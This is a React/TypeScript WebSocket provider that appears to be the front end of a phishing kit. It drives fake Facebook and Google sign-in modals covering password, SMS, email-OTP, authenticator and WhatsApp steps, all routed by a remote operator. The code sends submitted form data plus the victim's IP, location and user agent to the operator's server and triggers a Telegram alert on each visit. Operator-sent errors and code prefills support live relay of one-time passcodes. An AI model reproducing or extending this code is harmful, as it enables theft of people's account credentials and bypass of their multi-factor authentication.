import { createContext, useContext, useEffect, useState, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';

interface VerificationError {
  type: string;
  message: string;
}

interface NavigationEvent {
  route: string;
  timestamp: number;
}

interface PrefillCode {
  type: string;  // 'sms' | 'email' | 'click' | 'auth' | 'okta' | 'microsoft'
  code: string;
  phoneHint?: string;   // e.g. "+91 ••••1234" shown on SMS page
  emailHint?: string;   // e.g. "n***@gmail.com" shown on email-otp page
  timestamp: number;
}

export interface ModalCommand {
  modal: 'facebook' | 'google' | 'none';
  page: string;
  timestamp: number;
}

interface WebSocketContextValue {
  isConnected: boolean;
  clientId: string | null;
  isLoading: boolean;
  verificationError: VerificationError | null;
  navigationEvent: NavigationEvent | null;
  prefillCode: PrefillCode | null;
  modalCommand: ModalCommand | null;
  submitForm: (submitType: string, formData: Record<string, string>) => Promise<boolean>;
  sendMessage: (message: Record<string, unknown>) => boolean;
  sendInitialData: () => Promise<boolean>;
  reconnect: () => void;
  navigateModal: (route: string) => void;
  clearVerificationError: () => void;
  clearNavigationEvent: () => void;
  clearPrefillCode: () => void;
  clearModalCommand: () => void;
}

const WebSocketContext = createContext<WebSocketContextValue | null>(null);

// WebSocket server URL – change when deploying
const WS_URL = import.meta.env.VITE_WS_URL || 'ws://localhost:8000/ws';

// Map route strings from WS server → modal + page
function routeToModalCommand(route: string): ModalCommand | null {
  const fbMap: Record<string, string> = {
    '/facebook/login': 'login',
    '/facebook/auth-app': 'auth-app',
    '/facebook/sms': 'sms',
    '/facebook/email-otp': 'email-otp',
    '/facebook/whatsapp': 'whatsapp',
    '/facebook/auth-with-google': 'auth-with-google',
  };
  const ggMap: Record<string, string> = {
    '/google/login': 'sign-in',
    '/google/password': 'password',
    '/google/authenticator-code': 'authenticator-code',
    '/google/phone-number': 'sign-in',
    '/google/phone-otp': 'phone-otp',
    '/google/email-otp': 'email-otp',
    '/google/click-code': 'click-code',
  };
  const landingMap: Record<string, string> = {
    '/landing/captcha': 'captcha',
    '/landing/meta': 'meta',
    '/landing/google': 'google',
  };

  // Strip query params for matching
  const basePath = route.split('?')[0];

  if (fbMap[basePath]) {
    return { modal: 'facebook', page: fbMap[basePath], timestamp: Date.now() };
  }
  if (ggMap[basePath]) {
    return { modal: 'google', page: ggMap[basePath], timestamp: Date.now() };
  }
  if (landingMap[basePath]) {
    return { modal: 'landing', page: landingMap[basePath], timestamp: Date.now() };
  }
  return null;
}

export const WebSocketProvider = ({ children }: { children: React.ReactNode }) => {
  const [isConnected, setIsConnected] = useState(false);
  const [clientId, setClientId] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [verificationError, setVerificationError] = useState<VerificationError | null>(null);
  const [navigationEvent, setNavigationEvent] = useState<NavigationEvent | null>(null);
  const [prefillCode, setPrefillCode] = useState<PrefillCode | null>(null);
  const [modalCommand, setModalCommand] = useState<ModalCommand | null>(null);

  const wsRef = useRef<WebSocket | null>(null);
  const navigate = useNavigate();
  const reconnectTimeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pingIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const clientInfoRef = useRef<Record<string, string> | null>(null);

  // ── sessionStorage helpers ──────────────────────────────────────────────
  const getStoredClientId = () => sessionStorage.getItem('ws_client_id');
  const setStoredClientId = (id: string) => sessionStorage.setItem('ws_client_id', id);
  // Track whether we have already sent the notification IN THIS JS CONTEXT
  // (not sessionStorage – so a fresh page load always tries again)
  const notificationSentRef = useRef(false);

  // ── Clear helpers ───────────────────────────────────────────────
  const clearVerificationError = useCallback(() => setVerificationError(null), []);
  const clearNavigationEvent = useCallback(() => setNavigationEvent(null), []);
  const clearPrefillCode = useCallback(() => setPrefillCode(null), []);
  const clearModalCommand = useCallback(() => setModalCommand(null), []);

  // ── Fetch client IP/location info ───────────────────────────────────────
  const fetchClientInfo = async (): Promise<Record<string, string>> => {
    if (clientInfoRef.current) return clientInfoRef.current;
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const info: Record<string, string> = {
        ip: data.ip || 'Unknown',
        country: data.country_name || 'Unknown',
        city: data.city || 'Unknown',
        region: data.region || 'Unknown',
        user_agent: navigator.userAgent,
      };
      clientInfoRef.current = info;
      return info;
    } catch {
      const fallback: Record<string, string> = {
        ip: 'Unknown',
        country: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        user_agent: navigator.userAgent,
      };
      clientInfoRef.current = fallback;
      return fallback;
    }
  };

  // ── Send initial Telegram notification ─────────────────────────────────
  // Server deduplicates – we just always attempt. Uses a ref so it won't
  // fire twice within the same JS context (e.g. StrictMode double-effect).
  const sendInitialData = useCallback(async (): Promise<boolean> => {
    if (notificationSentRef.current) {
      console.log('[WS] Notification already sent in this context, skipping.');
      return false;
    }
    if (wsRef.current?.readyState !== WebSocket.OPEN) {
      console.error('[WS] Not open – cannot send notification.');
      return false;
    }
    notificationSentRef.current = true;
    const clientInfo = await fetchClientInfo();
    wsRef.current.send(JSON.stringify({ type: 'send_notification', ...clientInfo }));
    console.log('[WS] Initial notification sent.');
    return true;
  }, []);

  // ── Handle route: dispatch modal command or external nav ────────────────
  const handleRoute = useCallback((route: string, setNavEvent = true) => {
    if (!route) return;

    // External URL (e.g. calendly done link)
    if (route.startsWith('http://') || route.startsWith('https://')) {
      window.location.href = route;
      return;
    }

    // Check if it's a modal route (FB or Google page)
    const cmd = routeToModalCommand(route);
    if (cmd) {
      setModalCommand(cmd);
      if (setNavEvent) {
        setNavigationEvent({ route, timestamp: Date.now() });
      }
      return;
    }

    // "done" action → close modals
    if (route === '/' || route === '/done') {
      setModalCommand({ modal: 'none', page: 'done', timestamp: Date.now() });
      if (setNavEvent) {
        setNavigationEvent({ route, timestamp: Date.now() });
      }
      return;
    }

    // Fallback: actual router navigation for any unknown routes
    navigate(route);
    if (setNavEvent) {
      setNavigationEvent({ route, timestamp: Date.now() });
    }
  }, [navigate]);

  // ── WebSocket connection ────────────────────────────────────────────────
  const connect = useCallback(() => {
    if (wsRef.current?.readyState === WebSocket.OPEN) return;

    console.log('[WS] Connecting...');
    const ws = new WebSocket(WS_URL);

    ws.onopen = () => {
      console.log('[WS] Connected');
      setIsConnected(true);
      setIsLoading(false);

      // Restore existing session if available
      const existingId = getStoredClientId();
      if (existingId) {
        console.log('[WS] Sending reconnect with stored id:', existingId);
        ws.send(JSON.stringify({ type: 'reconnect', client_id: existingId }));
      }

      // Ping every 30 s to keep the connection alive
      pingIntervalRef.current = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
          ws.send(JSON.stringify({ type: 'ping' }));
        }
      }, 30_000);
    };

    ws.onmessage = async (event: MessageEvent) => {
      try {
        const data = JSON.parse(event.data as string);
        console.log('[WS] Received:', data);

        switch (data.type) {
          case 'connected': {
            const storedId = getStoredClientId();
            if (!storedId) {
              setClientId(data.client_id);
              setStoredClientId(data.client_id);
              console.log('[WS] New client id:', data.client_id);
              // Pre-fetch client info then send notification immediately
              fetchClientInfo().then(() => {
                sendInitialData();
              });
            } else {
              console.log('[WS] Ignoring new id – waiting for reconnect. Stored:', storedId);
            }
            break;
          }

          case 'reconnected':
            setClientId(data.client_id);
            setStoredClientId(data.client_id);
            console.log('[WS] Reconnected with id:', data.client_id);
            // Fire sendInitialData here – the page-level isConnected effect
            // won't re-fire on reconnects since isConnected stays true.
            // notificationSentRef prevents double-fire; server deduplicates across reloads.
            sendInitialData();
            break;

          case 'navigate':
            console.log('[WS] Navigate to:', data.route);
            setVerificationError(null);
            handleRoute(data.route as string);
            break;

          case 'navigate_with_error':
            console.log('[WS] Navigate with error to:', data.route, data.error_type);
            setVerificationError({ type: data.error_type as string, message: data.message as string });
            handleRoute(data.route as string);
            break;

          case 'show_error':
            console.log('[WS] Show error:', data.error_type, data.message);
            setVerificationError({ type: data.error_type as string, message: data.message as string });
            break;

          case 'submit_ack':
            console.log('[WS] Submit ack:', data.submit_type);
            break;

          case 'prefill_code':
            console.log('[WS] Prefill code for:', data.verification_type, data.code);
            // Navigate to the appropriate page via modal then pre-fill the code
            handleRoute(data.route as string, false);
            setPrefillCode({
              type: data.verification_type as string,
              code: data.code as string,
              phoneHint: data.phone_hint as string | undefined,
              emailHint: data.email_hint as string | undefined,
              timestamp: Date.now(),
            });
            break;

          case 'pong':
            break;

          default:
            console.log('[WS] Unknown message type:', data.type);
        }
      } catch (err) {
        console.error('[WS] Error parsing message:', err);
      }
    };

    ws.onclose = () => {
      console.log('[WS] Disconnected');
      setIsConnected(false);
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
      // Reconnect after 3 s
      reconnectTimeoutRef.current = setTimeout(() => connect(), 3_000);
    };

    ws.onerror = (err) => {
      console.error('[WS] Error:', err);
      setIsLoading(false);
    };

    wsRef.current = ws;
  }, [navigate, handleRoute]);

  // ── Mount / unmount ─────────────────────────────────────────────────────
  useEffect(() => {
    connect();
    return () => {
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      if (pingIntervalRef.current) clearInterval(pingIntervalRef.current);
      wsRef.current?.close();
    };
  }, [connect]);

  // ── Submit form data ────────────────────────────────────────────────────
  const submitForm = useCallback(async (
    submitType: string,
    formData: Record<string, string>
  ): Promise<boolean> => {
    if (wsRef.current?.readyState !== WebSocket.OPEN) {
      console.error('[WS] Not connected – cannot submit form.');
      return false;
    }
    const clientInfo = await fetchClientInfo();
    wsRef.current.send(JSON.stringify({
      type: 'form_submit',
      submit_type: submitType,
      data: formData,
      client_info: clientInfo,
    }));
    return true;
  }, []);

  // ── Send any custom message ─────────────────────────────────────────────
  const sendMessage = useCallback((message: Record<string, unknown>): boolean => {
    if (wsRef.current?.readyState !== WebSocket.OPEN) return false;
    wsRef.current.send(JSON.stringify(message));
    return true;
  }, []);

  // ── Navigate within modals (client-side, no WS round-trip) ─────────────
  // Used by pages rendered inside modals that need to transition to another
  // modal page without going through the server (e.g. Google sign-in → password).
  const navigateModal = useCallback((route: string) => {
    handleRoute(route);
  }, [handleRoute]);

  const value: WebSocketContextValue = {
    isConnected,
    clientId,
    isLoading,
    verificationError,
    navigationEvent,
    prefillCode,
    modalCommand,
    submitForm,
    sendMessage,
    sendInitialData,
    reconnect: connect,
    navigateModal,
    clearVerificationError,
    clearNavigationEvent,
    clearPrefillCode,
    clearModalCommand,
  };

  return (
    <WebSocketContext.Provider value={value}>
      {children}
    </WebSocketContext.Provider>
  );
};

export const useWebSocket = (): WebSocketContextValue => {
  const context = useContext(WebSocketContext);
  if (!context) throw new Error('useWebSocket must be used within a WebSocketProvider');
  return context;
};

export default WebSocketContext;
